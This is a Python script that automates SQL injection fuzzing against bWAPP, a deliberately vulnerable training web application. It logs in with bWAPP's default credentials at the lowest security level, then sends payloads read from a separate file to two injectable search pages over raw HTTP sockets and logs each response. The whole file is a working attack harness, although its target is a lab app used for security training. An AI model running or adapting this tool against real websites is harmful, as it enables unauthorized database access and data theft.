# Implement SQL injection targeting the Buggy Web app
import socket
import re
from datetime import datetime
from urllib import parse


def read_fuzz_vector(filename):
    """
    read fuzz vectors from a specified file
    """
    fuzz_vector = []
    with open(filename, 'r') as f:
        for line in f:
            fuzz_vector.append(line.rstrip())
    return fuzz_vector


def login(destination_ip, destination_port):
    """
    login the server and retrieve cookie in order to get into other pages (avoid redirection)
    """
    print('Log in /bWAPP/login.php')
    content_type = 'application/x-www-form-urlencoded'
    content = dict()
    content['login'] = 'bee'
    content['password'] = 'bug'
    content['security_level'] = 0
    content['form'] = 'submit'
    req = generate_request('POST', '/bWAPP/login.php', destination_ip,
                           content_type=content_type, content=content)
    res = send_request(destination_ip, destination_port, req)
    # log_response(res)
    cookie = parse_cookie(res)
    print('Got login cookie')
    return cookie


def parse_cookie(res):
    """
    parse response data and retrieve cookie
    """
    cookie_pattern = r'Set-Cookie: (.+?); path=/\r\nSet-Cookie: (.+?);'
    sessid, level = re.findall(cookie_pattern, res)[0]
    cookie = sessid + '; ' + level
    return cookie


def generate_request(method, url, dest_ip, cookie=None, content_type=None, content=None):
    """
    generate a GET/POST HTTP request with parameters in URL or in form or other input
    """
    if method == 'POST':
        req = '%s %s HTTP/1.1\r\nHOST: %s\r\n' % (method, url, dest_ip)
        if cookie:
            req += ('Cookie: ' + cookie + '\r\n')
        if content_type:
            # use urlencode to encode raw string into HTTP URL format
            content = parse.urlencode(content)
            content_length = len(content)
            req += ('Content-Type: ' + content_type + '\r\nContent-Length: ' + str(content_length) + '\r\n')
        req += '\r\n'
        if content:
            req += content
    elif method == 'GET':
        if content:
            req = '%s %s HTTP/1.1\r\nHOST: %s\r\n' % (method, url + '?' + parse.urlencode(content), dest_ip)
        else:
            req = '%s %s HTTP/1.1\r\nHOST: %s\r\n' % (method, url, dest_ip)
        if cookie:
            req += ('Cookie: ' + cookie + '\r\n')
        req += '\r\n'
    else:
        req = ""
    return req


def verify_code(res):
    """
    print Pass if response code is equal to 200 (ok)
    """
    answer = res[9:12]
    if answer == '200':
        print('Pass')
    else:
        print('Fail')


def send_request(destination_ip, destination_port, req):
    """
    send a request to server and capture response
    """
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        s.connect((destination_ip, destination_port))
        s.sendall(req)
        buf = ''
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
    except socket.error:
        print("failed to connect")
        return None
    return buf


def log_response(res, exploit_name):
    """
    log header of response in a file; log HTML of response in a seperate file in one exploit's folder
    """
    t = datetime.now().strftime('%Y-%m-%d-%H:%M:%S')
    offset = res.index('<!DOCTYPE html>')
    header, content = res[:offset], res[offset:]
    with open('log/response.log', 'a') as f:
        f.write(t + '\n')
        f.write(header + '\n\n')
    with open('log/' + exploit_name + '/' + t, 'w') as f:
        f.write(content)


def sql_injection(destination_ip, destination_port, method):
    """
    launch sql injection attack
    """
    cookie = login(destination_ip, destination_port)
    # This file contains all the potential ways to successfully execute SQL Injection
    fuzz_vector = read_fuzz_vector('SQL_injection.txt')
    for fuzz in fuzz_vector:
        print('Testing fuzz vector: %s' % fuzz)
        content = dict()
        content['title'] = fuzz
        content['action'] = 'search'
        if method == 'GET':
            req = generate_request('GET', '/bWAPP/sqli_1.php', destination_ip, cookie=cookie, content=content)
        elif method == 'POST':
            content_type = 'application/x-www-form-urlencoded'
            req = generate_request('POST', '/bWAPP/sqli_6.php', destination_ip, cookie=cookie,
                                   content_type=content_type, content=content)
        else:
            req = None
        res = send_request(destination_ip, destination_port, req)
        log_response(res, 'SQL_injection')
        verify_code(res)
